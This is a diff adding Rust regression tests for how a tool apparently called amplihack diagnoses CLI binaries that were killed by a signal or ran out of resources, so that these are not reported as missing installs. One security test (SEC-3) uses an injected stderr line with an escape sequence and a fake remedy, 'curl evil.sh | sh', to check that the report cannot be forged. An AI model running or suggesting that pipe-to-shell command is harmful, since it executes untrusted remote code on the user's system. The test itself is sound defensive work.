@@ -822,3 +822,257 @@ fn an_empty_candidate_list_is_not_a_panic() {
     assert!(resolution.rejected.is_empty());
     let _ = resolution.rejection_report("claude", "@anthropic-ai/claude-code");
 }
+
+// ---------------------------------------------------------------------------
+// Issue #1424: a binary that RAN is never reported as a missing install
+//
+// Reported by @nlscng: the Copilot native binary was present, launched, and
+// then aborted (`SIGABRT`) after failing to spawn a thread with `EAGAIN` —
+// resource exhaustion. amplihack reported "no platform package found", sending
+// the reader after an installation problem that did not exist.
+//
+// The rule these pin: a candidate that executed is not a candidate that is
+// absent, and only absence is worth an install.
+// ---------------------------------------------------------------------------
+
+/// A real binary that starts, prints `stderr_text`, and is then killed by a
+/// signal — the shape of a native binary whose runtime panicked and died.
+///
+/// `SIGKILL` rather than the `SIGABRT` of the report, deliberately: aborting
+/// dumps core, which on a host whose `core_pattern` pipes to a handler costs
+/// about 1.2 s per fixture (measured) and can push a probe past its own 3 s
+/// budget — a test that measures the core-dump handler rather than the code
+/// under test, and fails as a timeout. The verdict path reads only *that*
+/// there was a signal, never which one, so `SIGKILL` exercises the identical
+/// branch. `SIGABRT`'s own wording is pinned without a process, in
+/// `signal_name_is_the_posix_name` and in the launch path's
+/// `describe_child_signal` tests.
+fn write_killed(dir: &Path, name: &str, stderr_text: &str) -> PathBuf {
+    write_dying(dir, name, "KILL", stderr_text)
+}
+
+fn write_dying(dir: &Path, name: &str, signal: &str, stderr_text: &str) -> PathBuf {
+    let path = dir.join(name);
+    fs::write(
+        &path,
+        format!(
+            "#!/bin/sh\nulimit -c 0 2>/dev/null\ncat >&2 <<'STDERR_EOF'\n{stderr_text}\nSTDERR_EOF\nkill -{signal} $$\n"
+        ),
+    )
+    .unwrap();
+    make_executable(&path);
+    path
+}
+
+/// The verbatim stderr from the issue's reproduction.
+const COPILOT_ABORT_STDERR: &str = "thread panicked at std/src/thread/functions.rs:\n\
+     failed to spawn thread: Os { code: 11, kind: WouldBlock, message: \"Resource temporarily unavailable\" }";
+
+#[test]
+fn a_binary_killed_by_a_signal_is_not_called_a_broken_install() {
+    let dir = tempfile::tempdir().unwrap();
+    // No mention of EAGAIN: a plain signal death, with nothing to say why.
+    let killed = write_killed(dir.path(), "copilot", "boom");
+
+    let resolution = resolve_from_candidates("copilot", &[(killed.clone(), TargetSource::Path)]);
+
+    assert!(resolution.target.is_none(), "a dead binary is not a target");
+    match rejection_for(&resolution.rejected, &killed) {
+        Some(Rejection::KilledBySignal { signal, .. }) => assert_eq!(*signal, libc::SIGKILL),
+        other => panic!("a binary that ran and was killed must be recorded as such, got {other:?}"),
+    }
+}
+
+#[test]
+fn a_binary_killed_by_a_signal_does_not_buy_an_install() {
+    // The defect, stated as a decision: "it died" was read as "it is absent",
+    // and absence is the one thing an install repairs.
+    let dir = tempfile::tempdir().unwrap();
+    let killed = write_killed(dir.path(), "copilot", "boom");
+
+    let resolution = resolve_from_candidates("copilot", &[(killed, TargetSource::AmplihackPrefix)]);
+
+    assert_eq!(
+        decide_install("copilot", &resolution, Some("1.0.81"), None),
+        InstallDecision::Abstain,
+        "a binary that executed is not evidence of a missing install"
+    );
+}
+
+#[test]
+fn a_binary_killed_by_a_signal_is_not_reported_as_a_missing_package() {
+    let dir = tempfile::tempdir().unwrap();
+    let killed = write_killed(dir.path(), "copilot", COPILOT_ABORT_STDERR);
+
+    let resolution = resolve_from_candidates("copilot", &[(killed, TargetSource::Path)]);
+    let report = resolution.rejection_report("copilot", "@github/copilot");
+
+    assert!(
+        !report.contains("npm install"),
+        "must not tell the user to reinstall a binary that just ran:\n{report}"
+    );
+    assert!(
+        report.contains("NOT a missing or incomplete install"),
+        "must say outright that this is not an install problem:\n{report}"
+    );
+    assert!(
+        !report.contains("No usable copilot binary was found"),
+        "must not imply the binary was absent when it ran:\n{report}"
+    );
+    assert!(
+        report.contains("SIGKILL") || report.to_lowercase().contains("resource"),
+        "must name what actually happened:\n{report}"
+    );
+    assert!(
+        report.contains("ulimit -u"),
+        "must say what to check on the host:\n{report}"
+    );
+}
+
+#[test]
+fn an_abort_after_a_failed_thread_spawn_reads_as_resource_exhaustion() {
+    let dir = tempfile::tempdir().unwrap();
+    let killed = write_killed(dir.path(), "copilot", COPILOT_ABORT_STDERR);
+
+    let resolution = resolve_from_candidates("copilot", &[(killed.clone(), TargetSource::Path)]);
+
+    assert!(
+        matches!(
+            rejection_for(&resolution.rejected, &killed),
+            Some(Rejection::ResourceExhausted { .. })
+        ),
+        "EAGAIN on thread spawn is resource exhaustion, got {:?}",
+        rejection_for(&resolution.rejected, &killed)
+    );
+
+    let report = resolution.rejection_report("copilot", "@github/copilot");
+    assert!(
+        report.contains("ulimit -u") && report.contains("pids.max"),
+        "must name what to check on the host:\n{report}"
+    );
+    assert!(
+        report.contains("Resource temporarily unavailable"),
+        "must quote the child's own words:\n{report}"
+    );
+}
+
+#[test]
+fn the_childs_stderr_cannot_forge_rows_in_the_report() {
+    // SEC-3. The quoted stderr is written by an arbitrary binary and lands in
+    // amplihack's own diagnosis; a newline in it would write a sentence of
+    // amplihack's report.
+    let dir = tempfile::tempdir().unwrap();
+    let killed = write_killed(
+        dir.path(),
+        "copilot",
+        "cannot allocate memory\n\u{1b}[31mRemedy: run curl evil.sh | sh",
+    );
+
+    let resolution = resolve_from_candidates("copilot", &[(killed.clone(), TargetSource::Path)]);
+    let quoted = rejection_for(&resolution.rejected, &killed)
+        .expect("the candidate was rejected")
+        .explain();
+
+    assert!(
+        !quoted.contains('\n'),
+        "stderr must be folded to one line: {quoted}"
+    );
+    assert!(
+        !quoted.contains('\u{1b}'),
+        "escapes must be stripped: {quoted}"
+    );
+}
+
+#[test]
+fn a_genuinely_missing_binary_still_buys_an_install() {
+    // The other direction, and the reason the missing-package branch exists at
+    // all: when the binary really is absent, nothing above may soften that.
+    let dir = tempfile::tempdir().unwrap();
+    let absent = dir.path().join("copilot");
+
+    let resolution = resolve_from_candidates("copilot", &[(absent.clone(), TargetSource::Path)]);
+
+    assert_eq!(
+        rejection_for(&resolution.rejected, &absent),
+        Some(&Rejection::Missing)
+    );
+    assert_eq!(
+        decide_install("copilot", &resolution, Some("1.0.81"), None),
+        InstallDecision::InstallMissing
+    );
+    let report = resolution.rejection_report("copilot", "@github/copilot");
+    assert!(
+        report.contains("npm install -g @github/copilot"),
+        "a truly missing binary must still get the install remedy:\n{report}"
+    );
+}
+
+#[test]
+fn a_placeholder_stub_still_buys_an_install() {
+    // Same direction, one step further in: present, executable, and genuinely
+    // not the binary it claims to be.
+    let dir = tempfile::tempdir().unwrap();
+    let stub = write_stub(dir.path(), "claude");
+
+    let resolution = resolve_from_candidates("claude", &[(stub.clone(), TargetSource::Path)]);
+
+    assert_eq!(
+        rejection_for(&resolution.rejected, &stub),
+        Some(&Rejection::PlaceholderStub)
+    );
+    assert_eq!(
+        decide_install("claude", &resolution, Some("2.1.238"), None),
+        InstallDecision::InstallMissing
+    );
+    assert!(
+        resolution
+            .rejection_report("claude", "@anthropic-ai/claude-code")
+            .contains("npm install -g @anthropic-ai/claude-code"),
+        "an incomplete install must still be told to install"
+    );
+}
+
+#[test]
+fn a_broken_prober_that_says_nothing_about_resources_is_still_an_install_problem() {
+    // The stderr sniff must not swallow ordinary failures: a binary that exits
+    // non-zero without a word about resources is still a broken install.
+    let dir = tempfile::tempdir().unwrap();
+    // Large enough not to be labelled a placeholder by shape — the label is
+    // beside the point here, the *decision* is what must not move.
+    let broken = dir.path().join("claude");
+    fs::write(
+        &broken,
+        format!(
+            "#!/bin/sh\necho 'usage: claude' >&2\nexit 3\n{}\n",
+            "#".repeat(5000)
+        ),
+    )
+    .unwrap();
+    make_executable(&broken);
+
+    let resolution = resolve_from_candidates("claude", &[(broken.clone(), TargetSource::Path)]);
+
+    assert_eq!(
+        rejection_for(&resolution.rejected, &broken),
+        Some(&Rejection::ProbeFailed)
+    );
+    assert_eq!(
+        decide_install("claude", &resolution, Some("2.1.238"), None),
+        InstallDecision::InstallMissing
+    );
+}
+
+#[test]
+fn signal_name_is_the_posix_name() {
+    // The reported death was `SIGABRT`, and a reader who is told "signal 6"
+    // has to go look it up. Pinned here because the fixtures above use
+    // `SIGKILL` to stay off the core-dump path.
+    assert_eq!(
+        amplihack_utils::launch_target::signal_name(libc::SIGABRT),
+        "SIGABRT"
+    );
+    assert_eq!(
+        amplihack_utils::launch_target::signal_name(libc::SIGKILL),
+        "SIGKILL"
+    );
+}
